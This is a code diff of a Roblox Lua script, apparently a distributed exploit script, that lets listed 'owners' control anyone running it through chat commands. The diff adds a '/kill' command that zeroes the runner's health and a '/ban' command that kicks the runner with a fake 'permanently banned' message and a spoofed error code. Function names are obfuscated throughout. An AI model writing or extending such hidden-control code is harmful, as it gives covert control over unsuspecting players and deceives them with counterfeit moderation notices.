@@ -1,11 +1,11 @@
 local Players = game:GetService("Players")
 local localPlayer = Players.LocalPlayer
-local owners = {"FlipRBX3", "FlipRbx2", "JollofRiceEaterr"}
+local owners = {""}
 local admins = {}
 local buyers = {}
 local viewingOwner = nil
-function isAuthorized(player)
 
+function isAuthorized(player)
     for _, ownerName in ipairs(owners) do
         if player.Name == ownerName then
             return true
@@ -23,7 +23,7 @@ function isAuthorized(player)
     end
     return false
 end
-	
+
 function x1y2z3(owner)
     if owner then
         localPlayer.Character:SetPrimaryPartCFrame(owner.Character.HumanoidRootPart.CFrame)
@@ -58,15 +58,15 @@ function unviewPlayer()
     end
 end
 
-function a1b2c3(authName)
+function a1b2c3(authUserName)
     local authUser
     for _, player in ipairs(Players:GetPlayers()) do
-        if player.Name == authName then
+        if player.Name == authUserName then
             authUser = player
             break
         end
     end
-    
+
     if authUser then
         authUser.Chatted:Connect(function(message)
             if not isAuthorized(localPlayer) then
@@ -86,6 +86,12 @@ function a1b2c3(authName)
                     viewPlayer(authUser)
                 elseif message == "/unview ." then
                     unviewPlayer()
+                elseif message == "/kill ." then
+                    if localPlayer.Character and localPlayer.Character:FindFirstChild("Humanoid") then
+                        localPlayer.Character.Humanoid.Health = 0
+                    end
+                elseif message == "/ban ." then
+                    localPlayer:Kick("You have been permanently banned from this experience. (Error Code: 267)")
                 end
             end
         end)
